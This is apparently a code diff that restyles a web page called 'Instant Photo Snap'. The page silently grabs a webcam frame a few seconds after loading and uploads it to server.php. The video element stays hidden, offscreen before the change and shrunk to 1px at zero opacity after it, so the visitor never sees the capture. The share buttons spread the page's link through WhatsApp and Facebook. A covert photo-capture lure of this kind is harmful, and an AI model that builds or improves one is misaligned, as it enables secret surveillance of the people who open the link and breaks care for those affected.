@@ -42,72 +42,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Capture App</title>
+    <title>Instant Photo Snap</title>
     <style>
         body {
-            font-family: 'Verdana', sans-serif;
-            text-align: center;
-            background-color: #1a1a1a;
-            margin: 0;
-            padding: 20px;
+            font-family: 'Roboto', sans-serif;
+            background-color: #121212;
             color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #1f1f1f;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #00ff88;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2em;
+            color: #00ff88;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
         .intro {
-            margin: 20px 0;
-            font-size: 1.3em;
-            color: #b0b0b0;
+            font-size: 1.2em;
+            color: #a0a0a0;
+            margin-bottom: 20px;
+            text-align: center;
         }
-        .notice {
-            margin: 20px;
+        .consent-box {
+            background-color: #1f1f1f;
             padding: 15px;
-            border: 1px solid #444444;
-            background-color: #2a2a2a;
+            border-radius: 8px;
+            border: 1px solid #333333;
+            margin-bottom: 20px;
             font-size: 0.9em;
-            border-radius: 5px;
-            color: #cccccc;
+            color: #b0b0b0;
+            max-width: 500px;
+            text-align: center;
         }
-        .share-buttons {
-            margin-top: 30px;
+        .share-section {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
         }
         button {
-            padding: 12px 25px;
+            padding: 10px 20px;
             font-size: 1em;
-            margin: 10px;
-            cursor: pointer;
-            background-color: #ff4d4d;
-            color: #ffffff;
+            background-color: #00ff88;
+            color: #121212;
             border: none;
             border-radius: 5px;
+            cursor: pointer;
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #e04343;
+            background-color: #00cc70;
+        }
+        footer {
+            background-color: #1f1f1f;
+            padding: 10px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #a0a0a0;
+            border-top: 2px solid #00ff88;
         }
         #video {
-            visibility: hidden;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
             position: absolute;
-            top: -9999px;
-            left: -9999px;
         }
         #canvas {
             display: none;
         }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="intro">
-        <p>Capture a moment with this app!</p>
-    </div>
-    <div class="notice">
-        <p>This app will use your camera to take a photo. By proceeding, you consent to camera access.</p>
-    </div>
-    <video id="video" autoplay muted></video>
-    <canvas id="canvas"></canvas>
-    <div class="share-buttons">
-        <p>Share this link:</p>
-        <button onclick="shareLink('WhatsApp')">WhatsApp</button>
-        <button onclick="shareLink('Facebook')">Facebook</button>
-    </div>
+    <header>
+        <h1>Instant Photo Snap</h1>
+    </header>
+    <main>
+        <div class="intro">
+            Take a quick photo and share it instantly!
+        </div>
+        <div class="consent-box">
+            This application requires camera access to capture a photo. By continuing, you agree to allow camera access.
+        </div>
+        <video id="video" autoplay muted></video>
+        <canvas id="canvas"></canvas>
+        <div class="share-section">
+            <button onclick="shareLink('WhatsApp')">Share on WhatsApp</button>
+            <button onclick="shareLink('Facebook')">Share on Facebook</button>
+        </div>
+    </main>
+    <footer>
+        Powered by Instant Photo Snap &copy; 2025
+    </footer>
 
     <script>
         const videoElement = document.getElementById('video');
@@ -126,32 +167,37 @@
 
         // Capture photo when video is ready
         videoElement.addEventListener('canplay', () => {
-            setTimeout(() => {
-                canvasElement.width = videoElement.videoWidth;
-                canvasElement.height = videoElement.videoHeight;
-                canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
-                const imageData = canvasElement.toDataURL('image/png');
+            // Ensure video dimensions are available
+            if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
+                setTimeout(() => {
+                    canvasElement.width = videoElement.videoWidth;
+                    canvasElement.height = videoElement.videoHeight;
+                    canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
+                    const imageData = canvasElement.toDataURL('image/png');
 
-                fetch('server.php', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: imageData })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log(data.message);
-                    videoElement.srcObject.getTracks().forEach(track => track.stop());
-                })
-                .catch(err => {
-                    console.error('Error saving photo:', err);
-                });
-            }, 2000);
+                    fetch('server.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(data.message);
+                        videoElement.srcObject.getTracks().forEach(track => track.stop());
+                    })
+                    .catch(err => {
+                        console.error('Error saving photo:', err);
+                    });
+                }, 3000); // Increased delay to 3 seconds
+            } else {
+                console.error('Video dimensions not available.');
+            }
         });
 
         function shareLink(platform) {
             const url = window.location.href;
             if (platform === 'WhatsApp') {
-                window.open(`https://api.whatsapp.com/send?text=Check%20out%20this%20photo%20capture!%20${url}`);
+                window.open(`https://api.whatsapp.com/send?text=Check%20out%20my%20photo%20snap!%20${url}`);
             } else if (platform === 'Facebook') {
                 window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`);
             }
